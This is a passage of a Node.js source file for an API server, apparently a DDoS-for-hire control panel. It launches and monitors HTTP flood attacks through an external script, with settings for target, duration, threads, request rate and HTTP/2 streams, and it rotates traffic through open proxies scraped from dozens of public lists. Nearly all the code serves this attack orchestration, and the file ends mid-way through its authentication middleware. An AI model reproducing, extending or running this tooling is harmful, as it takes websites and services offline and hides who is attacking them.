// ============================================
// PRIV-DEMI-API.js - COMPLETE API SERVER
// ============================================

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const compression = require('compression');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { spawn, fork } = require('child_process');
const { performance } = require('perf_hooks');

// ============================================
// CONFIGURATION
// ============================================

const config = {
    // Server Configuration
    port: process.env.PORT || 3000,
    host: process.env.HOST || '0.0.0.0',
    environment: process.env.NODE_ENV || 'development',
    
    // Security
    apiKey: process.env.API_KEY || crypto.randomBytes(32).toString('hex'),
    enableAuth: process.env.ENABLE_AUTH !== 'false',
    jwtSecret: process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex'),
    
    // Attack Limits
    maxConcurrentAttacks: parseInt(process.env.MAX_CONCURRENT_ATTACKS) || 50,
    maxAttackDuration: parseInt(process.env.MAX_ATTACK_DURATION) || 3600, // 1 hour
    maxAttackThreads: parseInt(process.env.MAX_ATTACK_THREADS) || 500,
    maxAttackRate: parseInt(process.env.MAX_ATTACK_RATE) || 10000,
    
    // Performance
    workerCount: parseInt(process.env.WORKER_COUNT) || os.cpus().length,
    connectionPoolSize: parseInt(process.env.CONNECTION_POOL_SIZE) || 1000,
    requestBatchSize: parseInt(process.env.REQUEST_BATCH_SIZE) || 100,
    
    // Proxy Management
    proxyRefreshInterval: parseInt(process.env.PROXY_REFRESH_INTERVAL) || 300, // 5 minutes
    maxProxyCount: parseInt(process.env.MAX_PROXY_COUNT) || 10000,
    
    // Logging
    logLevel: process.env.LOG_LEVEL || 'info',
    logToFile: process.env.LOG_TO_FILE === 'true',
    logDirectory: process.env.LOG_DIR || './logs'
};

// ============================================
// LOGGER
// ============================================

class Logger {
    constructor() {
        this.levels = {
            error: 0,
            warn: 1,
            info: 2,
            http: 3,
            debug: 4
        };
        
        this.currentLevel = this.levels[config.logLevel] || 2;
        
        if (config.logToFile && !fs.existsSync(config.logDirectory)) {
            fs.mkdirSync(config.logDirectory, { recursive: true });
        }
    }
    
    log(level, message, data = {}) {
        const levelValue = this.levels[level];
        if (levelValue > this.currentLevel) return;
        
        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            level,
            message,
            ...data,
            pid: process.pid
        };
        
        // Console output
        const colors = {
            error: '\x1b[31m',
            warn: '\x1b[33m',
            info: '\x1b[36m',
            debug: '\x1b[35m',
            reset: '\x1b[0m'
        };
        
        console.log(`${colors[level] || ''}[${timestamp}] [${level.toUpperCase()}] ${message}${colors.reset}`);
        
        // File output
        if (config.logToFile) {
            const logFile = path.join(config.logDirectory, `${timestamp.split('T')[0]}.log`);
            fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
        }
    }
    
    error(message, error = null) {
        this.log('error', message, error ? { error: error.message, stack: error.stack } : {});
    }
    
    warn(message, data = {}) {
        this.log('warn', message, data);
    }
    
    info(message, data = {}) {
        this.log('info', message, data);
    }
    
    debug(message, data = {}) {
        this.log('debug', message, data);
    }
    
    http(message, data = {}) {
        this.log('http', message, data);
    }
}

const logger = new Logger();

// ============================================
// ATTACK MANAGER
// ============================================

class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.attackCounter = 0;
        this.workerPool = [];
        this.stats = {
            totalAttacks: 0,
            activeAttacks: 0,
            completedAttacks: 0,
            failedAttacks: 0,
            totalRequests: 0,
            totalSuccess: 0,
            totalErrors: 0,
            peakRPS: 0,
            currentRPS: 0
        };
        
        logger.info('Attack Manager initialized');
    }
    
    generateAttackId() {
        return `atk_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    }
    
    async launchAttack(attackConfig) {
        const attackId = this.generateAttackId();
        
        // Validate attack configuration
        const validation = this.validateAttackConfig(attackConfig);
        if (!validation.valid) {
            throw new Error(`Invalid attack config: ${validation.errors.join(', ')}`);
        }
        
        // Check concurrent attack limit
        if (this.stats.activeAttacks >= config.maxConcurrentAttacks) {
            throw new Error(`Maximum concurrent attacks (${config.maxConcurrentAttacks}) reached`);
        }
        
        const attack = {
            id: attackId,
            config: attackConfig,
            status: 'initializing',
            startTime: Date.now(),
            endTime: null,
            duration: 0,
            stats: {
                requests: 0,
                success: 0,
                errors: 0,
                goaway: 0,
                forbidden: 0,
                bytesSent: 0,
                currentRPS: 0,
                peakRPS: 0,
                lastUpdate: Date.now(),
                lastRequestCount: 0
            },
            worker: null,
            logs: [],
            events: []
        };
        
        this.attacks.set(attackId, attack);
        this.stats.totalAttacks++;
        this.stats.activeAttacks++;
        
        try {
            // Launch attack in a worker process
            const worker = this.launchWorker(attack);
            attack.worker = worker;
            attack.status = 'running';
            
            logger.info(`Attack ${attackId} launched`, {
                target: attackConfig.target,
                duration: attackConfig.duration,
                threads: attackConfig.threads,
                rate: attackConfig.rate
            });
            
            // Set auto-stop timeout
            if (attackConfig.duration > 0) {
                setTimeout(() => {
                    this.stopAttack(attackId);
                }, attackConfig.duration * 1000);
            }
            
            return attackId;
            
        } catch (error) {
            attack.status = 'failed';
            attack.error = error.message;
            this.stats.activeAttacks--;
            this.stats.failedAttacks++;
            logger.error(`Failed to launch attack ${attackId}`, error);
            throw error;
        }
    }
    
    launchWorker(attack) {
        const workerScript = `
            const { parentPort, workerData } = require('worker_threads');
            const { exec } = require('child_process');
            const path = require('path');
            
            const attackConfig = workerData;
            
            // Build command line arguments for PRIV-DEMI.js
            const args = [
                'PRIV-DEMI-Original.js',
                attackConfig.target,
                attackConfig.duration.toString(),
                attackConfig.proxyFile || 'proxies.txt',
                attackConfig.threads.toString(),
                attackConfig.rate.toString()
            ];
            
            // Add options
            if (attackConfig.options?.cookies) args.push('-c');
            if (attackConfig.options?.headfull) args.push('-h');
            if (attackConfig.options?.human) args.push('-human');
            if (attackConfig.options?.version) args.push('-v', attackConfig.options.version);
            if (attackConfig.options?.cache !== undefined) args.push('-ch', attackConfig.options.cache.toString());
            if (!attackConfig.options?.debug) args.push('-s');
            if (attackConfig.options?.h2ConcurrentStreams) {
                args.push('--h2-streams', attackConfig.options.h2ConcurrentStreams.toString());
            }
            
            // Execute the attack
            const child = exec(\`node \${args.join(' ')}\`, {
                maxBuffer: 1024 * 1024 * 10 // 10MB
            });
            
            // Capture output
            child.stdout.on('data', (data) => {
                parentPort.postMessage({
                    type: 'output',
                    data: data.toString()
                });
                
                // Parse stats from output
                const stats = parseStats(data.toString());
                if (stats) {
                    parentPort.postMessage({
                        type: 'stats',
                        data: stats
                    });
                }
            });
            
            child.stderr.on('data', (data) => {
                parentPort.postMessage({
                    type: 'error',
                    data: data.toString()
                });
            });
            
            child.on('close', (code) => {
                parentPort.postMessage({
                    type: 'complete',
                    data: { code }
                });
                process.exit(0);
            });
            
            // Handle termination
            parentPort.on('message', (msg) => {
                if (msg.type === 'stop') {
                    child.kill('SIGTERM');
                }
            });
            
            function parseStats(output) {
                // Parse the stats from PRIV-DEMI console output
                const stats = {};
                
                // Example: "Total Sent: 1000 | RPS: 500 | Success: 800 | Errors: 200"
                const sentMatch = output.match(/Total Sent: (\d+)/);
                const rpsMatch = output.match(/RPS: (\d+)/);
                const successMatch = output.match(/Success: (\d+)/);
                const errorMatch = output.match(/Errors: (\d+)/);
                
                if (sentMatch) stats.requests = parseInt(sentMatch[1]);
                if (rpsMatch) stats.currentRPS = parseInt(rpsMatch[1]);
                if (successMatch) stats.success = parseInt(successMatch[1]);
                if (errorMatch) stats.errors = parseInt(errorMatch[1]);
                
                return Object.keys(stats).length > 0 ? stats : null;
            }
        `;
        
        // In production, we'd use worker_threads
        // For now, spawn a child process
        const worker = spawn('node', ['PRIV-DEMI-Original.js', ...this.buildArgs(attack.config)], {
            detached: true,
            stdio: ['pipe', 'pipe', 'pipe']
        });
        
        worker.attackId = attack.id;
        
        // Capture output
        worker.stdout.on('data', (data) => {
            const output = data.toString();
            attack.logs.push({
                timestamp: Date.now(),
                type: 'output',
                message: output.trim()
            });
            
            // Parse stats
            const stats = this.parseStatsFromOutput(output);
            if (stats) {
                this.updateAttackStats(attack.id, stats);
                
                // Send to WebSocket clients
                this.broadcastAttackUpdate(attack.id, {
                    type: 'stats_update',
                    attackId: attack.id,
                    stats: attack.stats,
                    timestamp: Date.now()
                });
            }
        });
        
        worker.stderr.on('data', (data) => {
            attack.logs.push({
                timestamp: Date.now(),
                type: 'error',
                message: data.toString().trim()
            });
            
            logger.error(`Attack ${attack.id} error`, { error: data.toString() });
        });
        
        worker.on('close', (code) => {
            attack.status = code === 0 ? 'completed' : 'failed';
            attack.endTime = Date.now();
            attack.duration = attack.endTime - attack.startTime;
            
            this.stats.activeAttacks--;
            if (attack.status === 'completed') {
                this.stats.completedAttacks++;
            } else {
                this.stats.failedAttacks++;
            }
            
            logger.info(`Attack ${attack.id} ${attack.status}`, {
                duration: attack.duration,
                requests: attack.stats.requests,
                successRate: attack.stats.requests > 0 ? 
                    ((attack.stats.success / attack.stats.requests) * 100).toFixed(2) + '%' : '0%'
            });
            
            // Broadcast completion
            this.broadcastAttackUpdate(attack.id, {
                type: 'attack_complete',
                attackId: attack.id,
                status: attack.status,
                duration: attack.duration,
                finalStats: attack.stats
            });
        });
        
        return worker;
    }
    
    buildArgs(attackConfig) {
        const args = [
            attackConfig.target,
            attackConfig.duration.toString(),
            attackConfig.proxyFile || 'proxies.txt',
            attackConfig.threads.toString(),
            attackConfig.rate.toString()
        ];
        
        // Add options
        if (attackConfig.options?.cookies) args.push('-c');
        if (attackConfig.options?.headfull) args.push('-h');
        if (attackConfig.options?.human) args.push('-human');
        if (attackConfig.options?.version) args.push('-v', attackConfig.options.version);
        if (attackConfig.options?.cache !== undefined) args.push('-ch', attackConfig.options.cache.toString());
        if (!attackConfig.options?.debug) args.push('-s');
        if (attackConfig.options?.h2ConcurrentStreams) {
            args.push('--h2-streams', attackConfig.options.h2ConcurrentStreams.toString());
        }
        
        return args;
    }
    
    parseStatsFromOutput(output) {
        const stats = {};
        
        // Parse PRIV-DEMI console output
        const lines = output.split('\n');
        
        lines.forEach(line => {
            // Look for stats patterns
            if (line.includes('Total Sent:')) {
                const match = line.match(/Total Sent:\s*(\d+)/);
                if (match) stats.requests = parseInt(match[1]);
            }
            if (line.includes('RPS:')) {
                const match = line.match(/RPS:\s*(\d+)/);
                if (match) stats.currentRPS = parseInt(match[1]);
            }
            if (line.includes('Success:')) {
                const match = line.match(/Success:\s*(\d+)/);
                if (match) stats.success = parseInt(match[1]);
            }
            if (line.includes('Errors:')) {
                const match = line.match(/Errors:\s*(\d+)/);
                if (match) stats.errors = parseInt(match[1]);
            }
            if (line.includes('Goaways:')) {
                const match = line.match(/Goaways:\s*(\d+)/);
                if (match) stats.goaway = parseInt(match[1]);
            }
        });
        
        return Object.keys(stats).length > 0 ? stats : null;
    }
    
    updateAttackStats(attackId, newStats) {
        const attack = this.attacks.get(attackId);
        if (!attack) return;
        
        // Update attack stats
        Object.keys(newStats).forEach(key => {
            if (attack.stats[key] !== undefined) {
                attack.stats[key] = newStats[key];
            }
        });
        
        // Calculate RPS
        const now = Date.now();
        const timeDiff = (now - attack.stats.lastUpdate) / 1000;
        
        if (timeDiff > 0) {
            const requestDiff = attack.stats.requests - attack.stats.lastRequestCount;
            attack.stats.currentRPS = Math.round(requestDiff / timeDiff);
            
            if (attack.stats.currentRPS > attack.stats.peakRPS) {
                attack.stats.peakRPS = attack.stats.currentRPS;
            }
            
            attack.stats.lastUpdate = now;
            attack.stats.lastRequestCount = attack.stats.requests;
        }
        
        // Update global stats
        this.stats.totalRequests += newStats.requests || 0;
        this.stats.totalSuccess += newStats.success || 0;
        this.stats.totalErrors += newStats.errors || 0;
        
        // Update current RPS (average of all attacks)
        const activeAttacks = Array.from(this.attacks.values())
            .filter(a => a.status === 'running');
        
        if (activeAttacks.length > 0) {
            const totalRPS = activeAttacks.reduce((sum, a) => sum + (a.stats.currentRPS || 0), 0);
            this.stats.currentRPS = Math.round(totalRPS / activeAttacks.length);
            
            if (this.stats.currentRPS > this.stats.peakRPS) {
                this.stats.peakRPS = this.stats.currentRPS;
            }
        }
    }
    
    stopAttack(attackId) {
        const attack = this.attacks.get(attackId);
        if (!attack) {
            throw new Error(`Attack ${attackId} not found`);
        }
        
        if (attack.status === 'running' && attack.worker) {
            attack.worker.kill('SIGTERM');
            attack.status = 'stopped';
            attack.endTime = Date.now();
            attack.duration = attack.endTime - attack.startTime;
            
            this.stats.activeAttacks--;
            logger.info(`Attack ${attackId} stopped`);
            
            return true;
        }
        
        return false;
    }
    
    getAttack(attackId) {
        const attack = this.attacks.get(attackId);
        if (!attack) return null;
        
        return {
            id: attack.id,
            status: attack.status,
            config: attack.config,
            startTime: attack.startTime,
            endTime: attack.endTime,
            duration: attack.duration || Date.now() - attack.startTime,
            stats: attack.stats,
            logs: attack.logs.slice(-100) // Last 100 logs
        };
    }
    
    getAllAttacks(limit = 50, offset = 0) {
        const attacks = Array.from(this.attacks.values());
        
        return {
            active: attacks
                .filter(a => a.status === 'running')
                .slice(offset, offset + limit),
            history: attacks
                .filter(a => a.status !== 'running')
                .sort((a, b) => b.endTime - a.endTime)
                .slice(offset, offset + limit),
            totals: {
                active: attacks.filter(a => a.status === 'running').length,
                total: attacks.length
            }
        };
    }
    
    validateAttackConfig(config) {
        const errors = [];
        
        // Required fields
        if (!config.target) errors.push('target is required');
        if (!config.duration) errors.push('duration is required');
        if (!config.threads) errors.push('threads is required');
        if (!config.rate) errors.push('rate is required');
        
        // Validate target URL
        try {
            new URL(config.target);
        } catch {
            errors.push('Invalid target URL');
        }
        
        // Validate numeric values
        if (config.duration < 1 || config.duration > config.maxAttackDuration) {
            errors.push(`Duration must be between 1 and ${config.maxAttackDuration} seconds`);
        }
        
        if (config.threads < 1 || config.threads > config.maxAttackThreads) {
            errors.push(`Threads must be between 1 and ${config.maxAttackThreads}`);
        }
        
        if (config.rate < 1 || config.rate > config.maxAttackRate) {
            errors.push(`Rate must be between 1 and ${config.maxAttackRate}`);
        }
        
        // Validate options
        if (config.options) {
            if (config.options.h2ConcurrentStreams && 
                (config.options.h2ConcurrentStreams < 1 || config.options.h2ConcurrentStreams > 1000)) {
                errors.push('h2ConcurrentStreams must be between 1 and 1000');
            }
        }
        
        return {
            valid: errors.length === 0,
            errors
        };
    }
    
    broadcastAttackUpdate(attackId, data) {
        // Implementation for WebSocket broadcasting
        // This will be connected to the WebSocket server
        if (this.broadcastCallback) {
            this.broadcastCallback(attackId, data);
        }
    }
    
    setBroadcastCallback(callback) {
        this.broadcastCallback = callback;
    }
    
    getSystemStats() {
        const memory = process.memoryUsage();
        
        return {
            system: {
                uptime: process.uptime(),
                memory: {
                    rss: Math.round(memory.rss / 1024 / 1024) + 'MB',
                    heapTotal: Math.round(memory.heapTotal / 1024 / 1024) + 'MB',
                    heapUsed: Math.round(memory.heapUsed / 1024 / 1024) + 'MB'
                },
                cpu: process.cpuUsage(),
                loadavg: os.loadavg()
            },
            attacks: { ...this.stats },
            performance: {
                connections: this.workerPool.length,
                lastUpdate: new Date().toISOString()
            }
        };
    }
}

// ============================================
// PROXY MANAGER
// ============================================

class ProxyManager {
    constructor() {
        this.proxies = [];
        this.proxyIndex = 0;
        this.lastRefresh = 0;
        
        this.loadProxies();
        logger.info('Proxy Manager initialized');
    }
    
    loadProxies() {
        try {
            const proxyFile = path.join(__dirname, 'proxies.txt');
            if (fs.existsSync(proxyFile)) {
                const content = fs.readFileSync(proxyFile, 'utf-8');
                this.proxies = content
                    .split('\n')
                    .filter(line => line.trim().length > 0)
                    .map(line => line.trim());
                
                logger.info(`Loaded ${this.proxies.length} proxies`);
            } else {
                logger.warn('Proxy file not found, creating empty file');
                fs.writeFileSync(proxyFile, '');
            }
        } catch (error) {
            logger.error('Failed to load proxies', error);
        }
    }
    
    async refreshProxies(customSources = []) {
        try {
            logger.info('Refreshing proxies...');
            
            const sources = [
                'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5',
'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5',
'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
'https://www.proxyscan.io/download?type=http',
'https://proxyspace.pro/socks5.txt',
'https://proxyspace.pro/http.txt',
'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
'https://www.proxy-list.download/api/v1/get?type=http',
'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
'http://freeproxylist-daily.blogspot.com/2013/05/usa-proxy-list-2013-05-15-0111-am-gmt8.html',
'http://freeproxylist-daily.blogspot.com/2013/05/usa-proxy-list-2013-05-13-812-gmt7.html',
'http://vipprox.blogspot.com/2013_06_01_archive.html',
'http://vipprox.blogspot.com/2013/05/us-proxy-servers-74_24.html',
'http://vipprox.blogspot.com/p/blog-page_7.html',
'http://vipprox.blogspot.com/2013/05/us-proxy-servers-199_20.html',
'http://vipprox.blogspot.com/2013_02_01_archive.html',
'http://alexa.lr2b.com/proxylist.txt',
'http://vipprox.blogspot.com/2013_03_01_archive.html',
'http://browse.feedreader.com/c/Proxy_Server_List-1/449196251',
'http://free-ssh.blogspot.com/feeds/posts/default',
'http://browse.feedreader.com/c/Proxy_Server_List-1/449196259',
'http://sockproxy.blogspot.com/2013/04/11-04-13-socks-45.html',
'http://proxyfirenet.blogspot.com/',
'https://www.javatpoint.com/proxy-server-list',
'https://openproxy.space/list/http',
'http://proxydb.net/',
'http://olaf4snow.com/public/proxy.txt',
'https://openproxy.space/list/socks4',
'https://openproxy.space/list/socks5',
'http://rammstein.narod.ru/proxy.html',
'http://greenrain.bos.ru/R_Stuff/Proxy.htm',
'http://inav.chat.ru/ftp/proxy.txt',
'http://johnstudio0.tripod.com/index1.htm',
'http://atomintersoft.com/transparent_proxy_list',
'http://atomintersoft.com/anonymous_proxy_list',
'http://atomintersoft.com/high_anonymity_elite_proxy_list',
'http://atomintersoft.com/products/alive-proxy/proxy-list/3128',
'http://atomintersoft.com/products/alive-proxy/proxy-list/com',
'http://atomintersoft.com/products/alive-proxy/proxy-list/high-anonymity/',
'http://atomintersoft.com/products/alive-proxy/socks5-list',
'http://atomintersoft.com/proxy_list_domain_com',
'http://atomintersoft.com/proxy_list_domain_edu',
'http://atomintersoft.com/proxy_list_domain_net',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
'http://atomintersoft.com/proxy_list_domain_org',
'http://atomintersoft.com/proxy_list_port_3128',
'http://atomintersoft.com/proxy_list_port_80',
'http://atomintersoft.com/proxy_list_port_8000',
'http://atomintersoft.com/proxy_list_port_81',
'http://hack-hack.chat.ru/proxy/allproxy.txt',
'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
'http://hack-hack.chat.ru/proxy/anon.tx',
'http://hack-hack.chat.ru/proxy/p1.txt',
'http://hack-hack.chat.ru/proxy/p2.txt',
'http://hack-hack.chat.ru/proxy/p3.txt',
'http://hack-hack.chat.ru/proxy/p4.txt',
'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all',
'https://api.proxyscrape.com/?request=getproxies&proxytype=https&timeout=10000&country=all&ssl=all&anonymity=all',
'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            ];
            
            const newProxies = [];
            
            // Fetch from each source
            for (const source of sources) {
                try {
                    const response = await fetch(source);
                    const text = await response.text();
                    const proxies = text
                        .split('\n')
                        .filter(line => {
                            line = line.trim();
                            // Validate proxy format
                            return line.match(/^\d+\.\d+\.\d+\.\d+:\d+$/) || 
                                   line.match(/^https?:\/\/\d+\.\d+\.\d+\.\d+:\d+$/);
                        })
                        .map(line => line.trim());
                    
                    newProxies.push(...proxies);
                    logger.debug(`Fetched ${proxies.length} proxies from ${source}`);
                } catch (error) {
                    logger.warn(`Failed to fetch proxies from ${source}`, { error: error.message });
                }
            }
            
            // Deduplicate
            const uniqueProxies = [...new Set(newProxies)];
            
            // Save to file
            const proxyFile = path.join(__dirname, 'proxies.txt');
            fs.writeFileSync(proxyFile, uniqueProxies.join('\n'));
            
            // Update in-memory list
            this.proxies = uniqueProxies;
            this.proxyIndex = 0;
            this.lastRefresh = Date.now();
            
            logger.info(`Refreshed proxies: ${uniqueProxies.length} unique proxies found`);
            
            return {
                success: true,
                count: uniqueProxies.length,
                sources: sources.length
            };
            
        } catch (error) {
            logger.error('Failed to refresh proxies', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    getProxy() {
        if (this.proxies.length === 0) {
            return null;
        }
        
        const proxy = this.proxies[this.proxyIndex];
        this.proxyIndex = (this.proxyIndex + 1) % this.proxies.length;
        
        return proxy;
    }
    
    getProxies(count = 100) {
        if (count >= this.proxies.length) {
            return [...this.proxies];
        }
        
        // Return random selection
        const shuffled = [...this.proxies].sort(() => Math.random() - 0.5);
        return shuffled.slice(0, count);
    }
    
    getStats() {
        return {
            total: this.proxies.length,
            lastRefresh: this.lastRefresh,
            nextRefresh: this.lastRefresh + (config.proxyRefreshInterval * 1000)
        };
    }
}

// ============================================
// WEB SOCKET SERVER
// ============================================

class WebSocketServer {
    constructor(server) {
        this.wss = new WebSocket.Server({ server });
        this.clients = new Map();
        this.messageHandlers = new Map();
        
        this.initialize();
        logger.info('WebSocket server initialized');
    }
    
    initialize() {
        this.wss.on('connection', (ws, req) => {
            const clientId = crypto.randomUUID();
            const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            
            this.clients.set(clientId, {
                ws,
                id: clientId,
                ip: clientIp,
                connectedAt: Date.now(),
                subscriptions: new Set()
            });
            
            logger.http(`WebSocket client connected`, { clientId, ip: clientIp });
            
            // Send welcome message
            ws.send(JSON.stringify({
                type: 'welcome',
                clientId,
                timestamp: Date.now(),
                server: 'PRIV-DEMI API',
                version: '2.0.0'
            }));
            
            // Handle messages
            ws.on('message', (data) => {
                this.handleMessage(clientId, data);
            });
            
            // Handle disconnection
            ws.on('close', () => {
                this.handleDisconnection(clientId);
            });
            
            ws.on('error', (error) => {
                logger.error('WebSocket error', { clientId, error: error.message });
                this.handleDisconnection(clientId);
            });
        });
        
        // Heartbeat to keep connections alive
        setInterval(() => {
            this.broadcast({
                type: 'heartbeat',
                timestamp: Date.now()
            });
        }, 30000);
    }
    
    handleMessage(clientId, data) {
        try {
            const client = this.clients.get(clientId);
            if (!client) return;
            
            const message = JSON.parse(data.toString());
            
            // Route message to appropriate handler
            if (this.messageHandlers.has(message.type)) {
                const handler = this.messageHandlers.get(message.type);
                handler(client, message);
            } else {
                // Default handlers
                switch (message.type) {
                    case 'subscribe':
                        this.handleSubscribe(client, message);
                        break;
                    case 'unsubscribe':
                        this.handleUnsubscribe(client, message);
                        break;
                    case 'ping':
                        client.ws.send(JSON.stringify({
                            type: 'pong',
                            timestamp: Date.now()
                        }));
                        break;
                    default:
                        logger.warn(`Unknown WebSocket message type: ${message.type}`);
                }
            }
            
        } catch (error) {
            logger.error('Failed to handle WebSocket message', { error: error.message });
        }
    }
    
    handleSubscribe(client, message) {
        const { channel, attackId } = message;
        
        if (channel === 'attack' && attackId) {
            client.subscriptions.add(`attack:${attackId}`);
            client.ws.send(JSON.stringify({
                type: 'subscribed',
                channel: `attack:${attackId}`,
                timestamp: Date.now()
            }));
            
            logger.debug(`Client ${client.id} subscribed to attack ${attackId}`);
        } else if (channel === 'system') {
            client.subscriptions.add('system');
            client.ws.send(JSON.stringify({
                type: 'subscribed',
                channel: 'system',
                timestamp: Date.now()
            }));
        }
    }
    
    handleUnsubscribe(client, message) {
        const { channel, attackId } = message;
        
        if (channel === 'attack' && attackId) {
            client.subscriptions.delete(`attack:${attackId}`);
        } else if (channel === 'system') {
            client.subscriptions.delete('system');
        }
    }
    
    handleDisconnection(clientId) {
        const client = this.clients.get(clientId);
        if (client) {
            logger.http(`WebSocket client disconnected`, { 
                clientId, 
                duration: Date.now() - client.connectedAt 
            });
            this.clients.delete(clientId);
        }
    }
    
    broadcast(data, filter = null) {
        const message = JSON.stringify(data);
        
        for (const [clientId, client] of this.clients) {
            try {
                if (!filter || filter(client)) {
                    client.ws.send(message);
                }
            } catch (error) {
                logger.error(`Failed to send message to client ${clientId}`, { error: error.message });
            }
        }
    }
    
    broadcastToAttack(attackId, data) {
        this.broadcast(data, (client) => {
            return client.subscriptions.has(`attack:${attackId}`);
        });
    }
    
    broadcastToSystem(data) {
        this.broadcast(data, (client) => {
            return client.subscriptions.has('system');
        });
    }
    
    registerHandler(messageType, handler) {
        this.messageHandlers.set(messageType, handler);
    }
    
    getStats() {
        return {
            connectedClients: this.clients.size,
            subscriptions: Array.from(this.clients.values())
                .reduce((count, client) => count + client.subscriptions.size, 0)
        };
    }
}

// ============================================
// RATE LIMITER
// ============================================

class RateLimiter {
    constructor() {
        this.requests = new Map();
        this.blockedIPs = new Map();
        
        // Clean up old entries every minute
        setInterval(() => this.cleanup(), 60000);
    }
    
    check(ip, endpoint, limit = 100, windowMs = 60000) {
        // Check if IP is blocked
        if (this.blockedIPs.has(ip)) {
            const blockInfo = this.blockedIPs.get(ip);
            if (Date.now() < blockInfo.until) {
                return {
                    allowed: false,
                    remaining: 0,
                    reset: blockInfo.until,
                    reason: 'IP blocked'
                };
            } else {
                this.blockedIPs.delete(ip);
            }
        }
        
        const key = `${ip}:${endpoint}`;
        const now = Date.now();
        
        if (!this.requests.has(key)) {
            this.requests.set(key, []);
        }
        
        const requests = this.requests.get(key);
        
        // Remove old entries
        const cutoff = now - windowMs;
        while (requests.length > 0 && requests[0] < cutoff) {
            requests.shift();
        }
        
        // Check limit
        if (requests.length >= limit) {
            // Block IP temporarily for excessive requests
            if (requests.length > limit * 2) {
                this.blockedIPs.set(ip, {
                    until: now + 300000, // 5 minutes
                    reason: 'Excessive requests'
                });
            }
            
            return {
                allowed: false,
                remaining: 0,
                reset: requests[0] + windowMs,
                reason: 'Rate limit exceeded'
            };
        }
        
        // Add new request
        requests.push(now);
        
        return {
            allowed: true,
            remaining: limit - requests.length,
            reset: requests[0] + windowMs
        };
    }
    
    cleanup() {
        const now = Date.now();
        
        // Clean old requests
        for (const [key, requests] of this.requests) {
            const cutoff = now - 60000; // 1 minute window
            const newRequests = requests.filter(time => time > cutoff);
            
            if (newRequests.length === 0) {
                this.requests.delete(key);
            } else {
                this.requests.set(key, newRequests);
            }
        }
        
        // Clean expired blocks
        for (const [ip, blockInfo] of this.blockedIPs) {
            if (now >= blockInfo.until) {
                this.blockedIPs.delete(ip);
            }
        }
    }
}

// ============================================
// API SERVER
// ============================================

class APIServer {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.attackManager = new AttackManager();
        this.proxyManager = new ProxyManager();
        this.rateLimiter = new RateLimiter();
        this.wsServer = null;
        
        this.initializeMiddleware();
        this.initializeRoutes();
        this.initializeWebSocket();
        this.initializeScheduledTasks();
        
        logger.info('API Server initialized');
    }
    
    initializeMiddleware() {
        // Security middleware
        this.app.use(helmet({
            contentSecurityPolicy: false,
            crossOriginEmbedderPolicy: false
        }));
        
        // CORS
        this.app.use(cors({
            origin: process.env.CORS_ORIGINS ? 
                process.env.CORS_ORIGINS.split(',') : '*',
            methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
            allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
        }));
        
        // Rate limiting middleware
        this.app.use((req, res, next) => {
            const ip = req.ip || req.connection.remoteAddress;
            const endpoint = req.path;
            
            const limitCheck = this.rateLimiter.check(ip, endpoint, 100, 60000);
            
            if (!limitCheck.allowed) {
                res.set('X-RateLimit-Limit', '100');
                res.set('X-RateLimit-Remaining', limitCheck.remaining.toString());
                res.set('X-RateLimit-Reset', new Date(limitCheck.reset).toISOString());
                
                return res.status(429).json({
                    error: 'Rate limit exceeded',
                    message: 'Too many requests, please try again later.',
                    retryAfter: Math.ceil((limitCheck.reset - Date.now()) / 1000)
                });
            }
            
            res.set('X-RateLimit-Limit', '100');
            res.set('X-RateLimit-Remaining', limitCheck.remaining.toString());
            res.set('X-RateLimit-Reset', new Date(limitCheck.reset).toISOString());
            
            next();
        });
        
        // Body parsing
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
        
        // Compression
        this.app.use(compression());
        
        // Request logging
        this.app.use((req, res, next) => {
            const start = Date.now();
            req.requestId = crypto.randomUUID();
            
            res.on('finish', () => {
                const duration = Date.now() - start;
                logger.http(`${req.method} ${req.path}`, {
                    requestId: req.requestId,
                    method: req.method,
                    path: req.path,
                    status: res.statusCode,
                    duration: `${duration}ms`,
                    ip: req.ip,
                    userAgent: req.get('user-agent')
                });
            });
            
            next();
        });
        
        // Authentication middleware
        this.app.use((req, res, next) => {
            if (config.enableAuth) {
                const apiKey = req.headers['x-api-key'] || req.query.apiKey;
                
                if (!apiKey) {
                    return res.status(401).json({
